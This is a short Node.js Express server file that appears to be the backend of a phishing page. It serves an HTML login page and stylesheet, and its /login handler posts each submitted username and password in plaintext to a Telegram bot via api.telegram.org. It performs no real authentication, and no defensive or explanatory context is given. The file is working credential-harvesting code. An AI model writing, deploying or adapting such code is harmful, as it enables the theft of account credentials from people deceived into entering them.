const express = require("express");
const path = require("path");
const bodyParser = require("body-parser");
const axios = require("axios");
require("dotenv").config();

const app = express();

// Middleware
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Serve index.html
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

// Serve s.css
app.get("/s.css", (req, res) => {
  res.sendFile(path.join(__dirname, "s.css"));
});

// Handle login
app.post("/login", async (req, res) => {
  const { username, password } = req.body;

  try {
    // Send to Telegram bot
    const telegramUrl = `https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`;
    await axios.post(telegramUrl, {
      chat_id: process.env.TELEGRAM_CHAT_ID,
      text: `Login attempt:\nUser: ${username}\nPass: ${password}`
    });

    res.json({ success: true, message: "Sent to Telegram!" });
  } catch (err) {
    console.error(err);
    res.json({ success: false, message: "Error sending to Telegram" });
  }
});

module.exports = app;
